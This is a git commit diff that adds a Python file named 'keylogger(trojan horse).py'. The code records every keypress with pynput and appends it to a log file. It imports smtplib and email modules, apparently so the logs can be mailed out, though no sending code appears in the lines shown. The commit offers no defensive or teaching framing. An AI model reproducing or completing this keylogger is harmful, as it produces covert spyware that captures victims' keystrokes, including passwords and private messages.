096357e4149664e33bebdaa2ead1861f47b63e66
Sneha141102 <82695296+Sneha141102@users.noreply.github.com>
2021-05-20 15:26:21 +0530

    Update keylogger(trojan horse).py

--- keylogger(trojan horse).py
+++ keylogger(trojan horse).py
@@ -1,1 +1,23 @@
+from pynput import keyboard
+from pynput.keyboard import Key, Listener
+import smtplib
+import mimetypes
+from email.message import EmailMessage
 
+
+
+class KeyLogger():
+    def __init__(self, filename):
+        self.filename = filename
+
+    @staticmethod
+    def get_char(key):
+        try:
+            return key.char
+        except AttributeError:
+            return str(key)
+
+    def on_press(self, key):
+        print(key)
+        with open(self.filename, 'a') as logs:
+            logs.write(f'{self.get_char(key)}\n')
